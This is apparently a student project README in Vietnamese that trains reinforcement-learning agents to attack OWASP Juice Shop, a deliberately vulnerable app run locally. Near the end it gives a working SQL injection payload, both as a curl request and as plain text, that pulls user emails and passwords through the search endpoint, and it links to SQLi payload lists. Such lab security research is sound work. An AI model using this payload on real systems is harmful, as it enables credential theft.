# DACN

------------------------------------------------------------------------------------------------------
# Bước 0: Bật Docker 

docker run --rm -p 3000:3000 bkimminich/juice-shop

------------------------------------------------------------------------------------------------------
# Bước 1: Train trên Mock 

1. python main.py --mode train --config config/config_training.ini --save_path results/train_results/random_model.json --algo random

2. python main.py --mode train --config config/config_training.ini --save_path results/train_results/sarsa_model.json --algo sarsa

3. python main.py --mode train --config config/config_training.ini --save_path results/train_results/q_learning_model.json --algo q_learning

4. python main.py --mode train --config config/config_training.ini --load_path results/train_results/q_learning_model.json --save_path results/train_results/q_learning_transfer.json --algo q_learning

------------------------------------------------------------------------------------------------------
# Bước 2: Chạy trên Target dùng model đã train

1. python main.py --mode target --config config/config_target.ini --save_path results/target_results/random_target.json --algo random

2. python main.py --mode target --config config/config_target.ini --load_path results/train_results/sarsa_model.json --save_path results/target_results/sarsa_target.json --algo sarsa

3. python main.py --mode target --config config/config_target.ini --load_path results/train_results/q_learning_model.json --save_path results/target_results/q_learning_target.json --algo q_learning

4. python main.py --mode target --config config/config_target.ini --load_path results/train_results/q_learning_transfer.json --save_path results/target_results/q_transfer_target.json --algo q_learning

------------------------------------------------------------------------------------------------------
Search Bar

curl "http://localhost:3000/rest/products/search?q=a%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20Users--"

" a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users-- "

------------------------------------------------------------------------------------------------------
Dataset
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Databases/SQLi 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/Intruder

